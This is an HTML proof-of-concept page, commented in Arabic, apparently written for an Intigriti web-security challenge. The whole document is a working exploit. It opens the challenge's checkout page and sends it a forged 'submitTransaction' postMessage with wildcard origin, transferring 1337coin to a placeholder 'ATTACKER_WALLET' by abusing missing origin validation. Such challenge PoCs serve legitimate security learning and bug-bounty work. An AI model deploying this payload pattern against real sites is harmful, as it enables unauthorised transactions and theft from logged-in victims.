<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PostMessage Logic Abuse – PoC</title>
</head>
<body>

<script>
/*
  Preconditions:
  - Victim logged in
  - Target page listens to postMessage
  - No origin validation
*/

// افتح صفحة checkout
const win = window.open(
  "https://challenge-0126.intigriti.io/checkout.html?currency=1337coin&price=150",
  "_blank"
);

// استنى الصفحة تجهز
setTimeout(() => {

  // الرسالة الحساسة
  win.postMessage({
    type: "submitTransaction",
    transaction: {
      toAddress: "ATTACKER_WALLET",
      currency: "1337coin",
      amount: 1
    }
  }, "*");

  console.log("[+] submitTransaction sent");

}, 3000);
</script>

</body>
</html>
